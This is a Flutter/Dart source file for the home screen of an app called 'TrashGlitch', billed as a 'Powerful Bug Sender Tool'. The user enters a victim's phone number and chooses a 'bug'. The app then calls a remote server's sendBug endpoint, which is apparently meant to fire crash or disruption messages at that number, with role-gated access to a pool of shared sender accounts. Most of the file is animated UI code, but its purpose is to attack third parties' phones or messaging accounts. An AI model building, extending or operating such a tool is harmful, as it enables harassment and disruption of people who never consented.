import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class HomePage extends StatefulWidget {
  final bool isGroup;
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;

  const HomePage({
    super.key,
    required this.isGroup,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.sessionKey,
    required this.listBug,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  late VideoPlayerController _videoController;
  final targetController = TextEditingController();

  late AnimationController _slideController;
  late AnimationController _pulseController;
  late AnimationController _progressController;
  late Animation<Offset> _slideAnimation;
  late Animation<double> _progressAnimation;

  String selectedBugId = "";
  String _senderType = "private";
  bool _isSending = false;
  bool _isVideoInitialized = false;

  int _currentStep = 0;
  double _progress = 0.0;
  List<String> _progressSteps = [];

  int _globalSenderCount = 0;   // total sender global (online + offline)

  // ─── PALET WARNA HITAM + AKSEN HIDUP ──────────────────────────────────
  final Color bgBlack = const Color(0xFF0D0D0F);
  final Color cardDark = const Color(0xFF1A0A0A);
  final Color cardDeep = const Color(0xFF800000);
  final Color accentCyan = const Color(0xFFB22222);
  final Color accentLime = const Color(0xFF3D0A0A);
  final Color accentPurple = const Color(0xFF4A1A1A);
  final Color accentGold = const Color(0xFF006400);
  final Color accentOrange = const Color(0xFFFFD700);
  final Color accentPink = const Color(0xFF8B0000);
  final Color textWhite = Colors.white;
  final Color textGrey = const Color(0xFF2A1A1A);

  final List<Color> bugChipColors = [
    const Color(0xFF00E5FF),
    const Color(0xFFFF9100),
    const Color(0xFFBB86FC),
    const Color(0xFF1DE9B6),
    const Color(0xFFAEEA00),
    const Color(0xFF448AFF),
    const Color(0xFFFFD700),
    const Color(0xFFFF4081),
  ];

  @override
  void initState() {
    super.initState();

    _videoController = VideoPlayerController.asset("assets/videos/landing.mp4")
      ..initialize().then((_) {
        setState(() => _isVideoInitialized = true);
        _videoController.setLooping(true);
        _videoController.setVolume(0);
        _videoController.play();
      });

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..forward();

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.3),
      end: Offset.zero,
    ).animate(CurvedAnimation(
      parent: _slideController,
      curve: Curves.easeOutCubic,
    ));

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _progressController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _progressAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _progressController, curve: Curves.easeInOut),
    );

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    _progressSteps = [
      "Initializing...",
      "Connecting to server...",
      "Validating session...",
      "Preparing payload...",
      "Sending bug...",
      "Success!"
    ];

    _fetchGlobalSenderCount();
  }

  Future<void> _fetchGlobalSenderCount() async {
    try {
      final res = await http.get(
        Uri.parse('http://udanstore-node.hostkita.help:2861/getGlobalSenders?key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          final total = data['total'] as int? ?? 0;
          if (mounted) setState(() => _globalSenderCount = total);
        }
      }
    } catch (_) {
      if (mounted) setState(() => _globalSenderCount = 0);
    }
  }

  @override
  void dispose() {
    _videoController.dispose();
    _slideController.dispose();
    _pulseController.dispose();
    _progressController.dispose();
    targetController.dispose();
    super.dispose();
  }

  Future<void> _updateProgress(int step) async {
    setState(() {
      _currentStep = step;
      _progress = (step + 1) / _progressSteps.length;
    });
    _progressController.reset();
    _progressController.forward();
    await Future.delayed(const Duration(milliseconds: 600));
  }

  Future<void> _sendBugNomor() async {
    final target = targetController.text.trim();
    if (target.isEmpty) {
      _showPopup("Error", "Nomor target tidak boleh kosong!", isError: true);
      return;
    }

    setState(() {
      _isSending = true;
      _currentStep = 0;
      _progress = 0.0;
    });

    try {
      await _updateProgress(0);
      await _updateProgress(1);
      await _updateProgress(2);
      await _updateProgress(3);
      final url =
          "http://udanstore-node.hostkita.help:2861/sendBug?key=${widget.sessionKey}&target=$target&bug=$selectedBugId&senderType=$_senderType";
      await _updateProgress(4);
      final res = await http.get(Uri.parse(url));
      final data = jsonDecode(res.body);

      bool isSuccess = false;
      String msg = "";
      if (data["cooldown"] == true) {
        msg = "Cooldown: Tunggu ${data['wait']} detik.";
      } else if (data["valid"] == false) {
        msg = "Sesi Invalid.";
      } else if (data["sended"] == false) {
        msg = "Gagal: Server Maintenance.";
      } else {
        isSuccess = true;
        msg = "Bug berhasil dikirim!";
        await _updateProgress(5);
      }

      await Future.delayed(const Duration(milliseconds: 500));
      if (isSuccess) {
        _showPopup("Success", msg, isError: false);
        targetController.clear();
      } else {
        _showPopup("Failed", msg, isError: true);
      }
    } catch (e) {
      _showPopup("Connection Error", "Gagal menghubungi server.", isError: true);
    } finally {
      setState(() {
        _isSending = false;
        _currentStep = 0;
        _progress = 0.0;
      });
    }
  }

  void _showPopup(String title, String message, {bool isError = false}) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: AlertDialog(
          backgroundColor: cardDark,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(
              color: isError ? accentPink : accentLime,
              width: 1.5,
            ),
          ),
          title: Row(
            children: [
              Icon(
                isError ? Icons.error_outline : Icons.check_circle_outline,
                color: isError ? accentPink : accentLime,
              ),
              const SizedBox(width: 10),
              Text(title,
                  style: const TextStyle(
                      color: Colors.white, fontWeight: FontWeight.bold)),
            ],
          ),
          content: Text(message,
              style: const TextStyle(color: Colors.white70)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("OK",
                  style: TextStyle(color: accentCyan)),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgBlack,
      body: Stack(
        children: [
          Container(color: bgBlack),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  accentPurple.withOpacity(0.05),
                  bgBlack,
                ],
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
              ),
            ),
          ),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              child: SlideTransition(
                position: _slideAnimation,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _buildProfileCard(),
                    const SizedBox(height: 20),
                    _buildVideoBanner(),
                    const SizedBox(height: 20),
                    _buildSectionTitle(
                        Icons.phone_android, "TARGET NUMBER", accentCyan),
                    const SizedBox(height: 10),
                    _buildTextField(
                      controller: targetController,
                      hint: "628xxxxxxxx",
                      prefixIcon: Icons.phone,
                      accentColor: accentCyan,
                    ),
                    const SizedBox(height: 25),
                    _buildSectionTitle(
                        Icons.bug_report, "PILIH BUG", accentPurple),
                    const SizedBox(height: 10),
                    _buildDropdown(),
                    const SizedBox(height: 30),
                    if (_isSending) _buildProgressIndicator(),
                    if (_isSending) const SizedBox(height: 30),
                    _buildSendButton(
                      onPressed: _sendBugNomor,
                      label: "SEND BUG NOMOR",
                    ),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoBanner() {
    return Container(
      width: double.infinity,
      height: 200,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: accentPurple.withOpacity(0.5), width: 2),
        boxShadow: [
          BoxShadow(
              color: accentPurple.withOpacity(0.2),
              blurRadius: 15,
              spreadRadius: 2)
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (_isVideoInitialized)
              FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              )
            else
              Container(
                color: cardDeep,
                child: const Center(
                    child:
                        CircularProgressIndicator(color: Colors.white)),
              ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [Colors.transparent, bgBlack.withOpacity(0.9)],
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                ),
              ),
            ),
            Positioned(
              bottom: 20,
              left: 20,
              right: 20,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "TrashGlitch - Apps",
                    style: TextStyle(
                      color: accentGold,
                      fontWeight: FontWeight.bold,
                      fontSize: 24,
                      fontFamily: 'Orbitron',
                      shadows: [
                        Shadow(color: Colors.black.withOpacity(0.5), blurRadius: 10)
                      ],
                    ),
                  ),
                  const SizedBox(height: 5),
                  Text(
                    "Powerful Bug Sender Tool",
                    style: TextStyle(color: accentCyan, fontSize: 14),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildProgressIndicator() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, bgBlack],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: accentPurple.withOpacity(0.5)),
        boxShadow: [
          BoxShadow(color: accentPurple.withOpacity(0.1), blurRadius: 15)
        ],
      ),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: List.generate(_progressSteps.length, (index) {
              bool isActive = index <= _currentStep;
              bool isCurrent = index == _currentStep;
              return Expanded(
                child: Column(
                  children: [
                    Container(
                      width: 40,
                      height: 40,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: isActive
                            ? LinearGradient(
                                colors: [accentCyan, accentPurple])
                            : null,
                        color: isActive ? null : Colors.white12,
                        border: Border.all(
                          color: isCurrent ? accentCyan : Colors.white24,
                          width: isCurrent ? 2 : 1,
                        ),
                        boxShadow: isCurrent
                            ? [
                                BoxShadow(
                                    color: accentCyan.withOpacity(0.5),
                                    blurRadius: 10,
                                    spreadRadius: 2)
                              ]
                            : [],
                      ),
                      child: Center(
                        child: isActive && index < _currentStep
                            ? const Icon(Icons.check,
                                color: Colors.white, size: 20)
                            : Text(
                                '${index + 1}',
                                style: TextStyle(
                                  color: isActive ? Colors.white : Colors.grey,
                                  fontWeight: FontWeight.bold,
                                  fontSize: 16,
                                ),
                              ),
                      ),
                    ),
                    if (index < _progressSteps.length - 1)
                      Container(
                        margin: const EdgeInsets.only(top: 5),
                        height: 2,
                        color: isActive ? accentCyan : Colors.white12,
                      ),
                  ],
                ),
              );
            }),
          ),
          const SizedBox(height: 20),
          AnimatedBuilder(
            animation: _progressAnimation,
            builder: (context, child) {
              return Column(
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(10),
                    child: LinearProgressIndicator(
                      value: _progress * _progressAnimation.value,
                      minHeight: 10,
                      backgroundColor: Colors.white12,
                      valueColor:
                          AlwaysStoppedAnimation<Color>(accentCyan),
                    ),
                  ),
                  const SizedBox(height: 10),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        _progressSteps[_currentStep],
                        style: TextStyle(
                            color: accentCyan,
                            fontSize: 14,
                            fontWeight: FontWeight.bold),
                      ),
                      Text(
                        '${(_progress * 100).toInt()}%',
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.bold),
                      ),
                    ],
                  ),
                ],
              );
            },
          ),
        ],
      ),
    );
  }

  Widget _buildProfileCard() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, bgBlack],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: accentPurple.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(color: accentPurple.withOpacity(0.1), blurRadius: 15)
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(3),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(color: accentCyan, width: 2),
            ),
            child: const CircleAvatar(
              radius: 32,
              backgroundImage: AssetImage('assets/images/icon.jpg'),
            ),
          ),
          const SizedBox(width: 15),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  widget.username,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                    fontSize: 20,
                  ),
                ),
                const SizedBox(height: 8),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 10, vertical: 4),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [accentCyan, accentPurple],
                        ),
                        borderRadius: BorderRadius.circular(6),
                      ),
                      child: Text(
                        "Role: ${widget.role.toUpperCase()}",
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 10,
                            fontWeight: FontWeight.bold),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 10, vertical: 4),
                      decoration: BoxDecoration(
                        color: accentGold.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(color: accentGold.withOpacity(0.3)),
                      ),
                      child: Text(
                        "Exp: ${widget.expiredDate}",
                        style: TextStyle(
                            color: accentGold,
                            fontSize: 10,
                            fontWeight: FontWeight.bold),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSectionTitle(IconData icon, String title, Color color) {
    return Row(
      children: [
        Icon(icon, color: color, size: 20),
        const SizedBox(width: 10),
        Text(
          title,
          style: TextStyle(
            color: color,
            fontWeight: FontWeight.bold,
            fontSize: 14,
            letterSpacing: 1,
          ),
        ),
      ],
    );
  }

  Widget _buildTextField({
    required TextEditingController controller,
    required String hint,
    IconData? prefixIcon,
    Color accentColor = const Color(0xFF00E5FF),
  }) {
    return Container(
      decoration: BoxDecoration(
        color: cardDark,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: accentColor.withOpacity(0.3)),
      ),
      child: TextField(
        controller: controller,
        style: const TextStyle(color: Colors.white),
        cursorColor: accentColor,
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: TextStyle(color: Colors.grey.shade500, fontSize: 13),
          border: InputBorder.none,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          prefixIcon: prefixIcon != null
              ? Icon(prefixIcon, color: accentColor, size: 20)
              : null,
          suffixIcon: IconButton(
            icon: const Icon(Icons.clear, color: Colors.white54, size: 20),
            onPressed: controller.clear,
          ),
        ),
      ),
    );
  }

  Widget _buildDropdown() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        // ── Sender Type Card ─────────────────────────────────────
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: Colors.white12),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [
                Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                        color: Colors.white10,
                        borderRadius: BorderRadius.circular(8)),
                    child: const Icon(Icons.dns_rounded,
                        color: Colors.white, size: 18)),
                const SizedBox(width: 10),
                const Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('Sender Type',
                          style: TextStyle(
                              color: Colors.white,
                              fontSize: 13,
                              fontWeight: FontWeight.bold)),
                      Text('Pilih sumber nomor pengirim',
                          style: TextStyle(
                              color: Colors.white38, fontSize: 10)),
                    ]),
                const Spacer(),
                GestureDetector(
                  onTap: () {
                    _fetchGlobalSenderCount();
                    setState(() {});
                  },
                  child: Container(
                      padding: const EdgeInsets.all(6),
                      decoration: BoxDecoration(
                          color: Colors.white10,
                          borderRadius: BorderRadius.circular(8)),
                      child: const Icon(Icons.refresh_rounded,
                          color: Colors.white60, size: 16)),
                ),
              ]),
              const SizedBox(height: 14),
              Row(children: [
                Expanded(
                    child: _senderTypeCard(
                        'Global ($_globalSenderCount)',
                        'global',
                        Icons.language_rounded,
                        'Public Sender',
                        accentLime)),
                const SizedBox(width: 10),
                Expanded(
                    child: _senderTypeCard('Private', 'private',
                        Icons.person_rounded, 'Session pribadi', accentCyan)),
              ]),
              const SizedBox(height: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                decoration: BoxDecoration(
                    color: Colors.black26,
                    borderRadius: BorderRadius.circular(10)),
                child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(children: [
                        Container(
                            width: 8,
                            height: 8,
                            decoration: BoxDecoration(
                                color:
                                    _senderType == 'global'
                                        ? accentLime
                                        : accentCyan,
                                shape: BoxShape.circle)),
                        const SizedBox(width: 8),
                        Text(
                          _senderType == 'global'
                              ? 'Public sender tersedia ($_globalSenderCount terdaftar)'
                              : 'Private sender aktif',
                          style: const TextStyle(
                              color: Colors.white70,
                              fontSize: 11,
                              fontWeight: FontWeight.w600),
                        ),
                      ]),
                      const SizedBox(height: 6),
                      if (_senderType == 'global') ...[
                        Text(
                            '• Menggunakan sender global yang terdaftar',
                            style: const TextStyle(
                                color: Colors.white38, fontSize: 10)),
                      ] else ...[
                        const Text('• Menggunakan session pribadi',
                            style: TextStyle(
                                color: Colors.white38, fontSize: 10)),
                        const Text('• Lebih stabil, limit tergantung akun',
                            style: TextStyle(
                                color: Colors.white38, fontSize: 10)),
                      ],
                    ]),
              ),
            ],
          ),
        ),
        const SizedBox(height: 14),
        SizedBox(
          height: 40,
          child: SingleChildScrollView(
            scrollDirection: Axis.horizontal,
            child: Row(
              children: widget.listBug.asMap().entries.map((entry) {
                final bug = entry.value;
                final index = entry.key;
                final isSel = selectedBugId == bug['bug_id'];
                final chipColor = bugChipColors[index % bugChipColors.length];
                return Padding(
                  padding: const EdgeInsets.only(right: 8),
                  child: GestureDetector(
                    onTap: () =>
                        setState(() => selectedBugId = bug['bug_id']!),
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 14, vertical: 8),
                      decoration: BoxDecoration(
                        color: isSel ? chipColor.withOpacity(0.2) : Colors.transparent,
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(
                          color: isSel ? chipColor : Colors.white24,
                          width: isSel ? 2 : 1,
                        ),
                        boxShadow: isSel
                            ? [
                                BoxShadow(
                                    color: chipColor.withOpacity(0.4),
                                    blurRadius: 6,
                                    spreadRadius: 1)
                              ]
                            : [],
                      ),
                      child: Text(
                        bug['bug_name']?.toString() ?? '',
                        style: TextStyle(
                          color: isSel ? chipColor : Colors.white54,
                          fontSize: 12,
                          fontWeight:
                              isSel ? FontWeight.bold : FontWeight.normal,
                        ),
                      ),
                    ),
                  ),
                );
              }).toList(),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSendButton(
      {required VoidCallback onPressed, required String label}) {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(15),
            boxShadow: [
              BoxShadow(
                color: accentPurple.withOpacity(0.3 * _pulseController.value),
                blurRadius: 15 * _pulseController.value,
                spreadRadius: 2 * _pulseController.value,
              ),
            ],
          ),
          child: child,
        );
      },
      child: SizedBox(
        width: double.infinity,
        height: 55,
        child: ElevatedButton(
          onPressed: _isSending ? null : onPressed,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.transparent,
            padding: EdgeInsets.zero,
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(15)),
            elevation: 0,
          ),
          child: Ink(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [accentCyan, accentPurple],
                begin: Alignment.centerLeft,
                end: Alignment.centerRight,
              ),
              borderRadius: BorderRadius.circular(15),
            ),
            child: Container(
              alignment: Alignment.center,
              child: _isSending
                  ? Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: const [
                        SizedBox(
                          width: 24,
                          height: 24,
                          child: CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 2,
                          ),
                        ),
                        SizedBox(width: 15),
                        Text(
                          "SENDING...",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 14,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(Icons.send_rounded, color: Colors.white),
                        const SizedBox(width: 10),
                        Text(
                          label,
                          style: const TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 16,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _senderTypeCard(String label, String value, IconData icon,
      String sub, Color activeColor) {
    final bool isSel = _senderType == value;
    final bool isDisabled = value == 'global' &&
        widget.role != 'owner' &&
        widget.role != 'moderator' &&
        widget.role != 'partner';

    return GestureDetector(
      onTap: isDisabled ? null : () => setState(() => _senderType = value),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 12),
        decoration: BoxDecoration(
          color: isDisabled
              ? Colors.white.withOpacity(0.03)
              : isSel
                  ? activeColor.withOpacity(0.12)
                  : cardDark,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: isDisabled
                ? Colors.white10
                : isSel
                    ? activeColor
                    : Colors.white12,
            width: isSel ? 1.5 : 1,
          ),
        ),
        child: Column(children: [
          Icon(icon,
              color: isDisabled
                  ? Colors.white12
                  : isSel
                      ? activeColor
                      : Colors.white38,
              size: 30),
          const SizedBox(height: 8),
          Text(label,
              style: TextStyle(
                  color: isDisabled
                      ? Colors.white12
                      : isSel
                          ? activeColor
                          : Colors.white60,
                  fontWeight:
                      isSel ? FontWeight.bold : FontWeight.normal,
                  fontSize: 14)),
          const SizedBox(height: 4),
          Text(
            isDisabled ? 'Khusus role Partner ke atas' : sub,
            style: TextStyle(
                color: isDisabled ? Colors.white12 : Colors.white38,
                fontSize: 10),
          ),
          const SizedBox(height: 6),
          Container(
              height: 3,
              width: 30,
              decoration: BoxDecoration(
                  color: isSel && !isDisabled
                      ? activeColor
                      : Colors.transparent,
                  borderRadius: BorderRadius.circular(2))),
        ]),
      ),
    );
  }
}